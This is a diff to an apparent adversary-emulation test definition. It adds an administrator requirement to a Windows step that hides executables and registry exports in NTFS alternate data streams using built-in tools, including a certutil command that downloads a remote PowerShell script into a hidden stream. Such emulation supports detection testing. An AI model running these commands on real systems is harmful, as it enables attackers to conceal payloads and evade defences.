@@ -21,6 +21,7 @@ mitre:
 requirements:
     platforms:
         - os: windows
+    superuser: true
 steps:
     - name: alternate-data-streams-(ads)
       inline: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 {{.Args.path}}\\procexp.cab {{.Args.path}}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump {{.Args.path}}\\procexp.exe > {{.Args.path}}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab {{.Args.path}}\\autoruns.exe {{.Args.path}}\\cabtest.txt:autoruns.cab\nprint /D:{{.Args.path}}\\file.txt:autoruns.exe {{.Args.path}}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {{.Args.path}}\\file.txt:evilreg.reg\nregedit /E {{.Args.path}}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat {{.Args.path}}\\file.txt:file.bat\nesentutl.exe /y {{.Args.path}}\\autoruns.exe /d {{.Args.path}}\\file.txt:autoruns.exe /o \n"
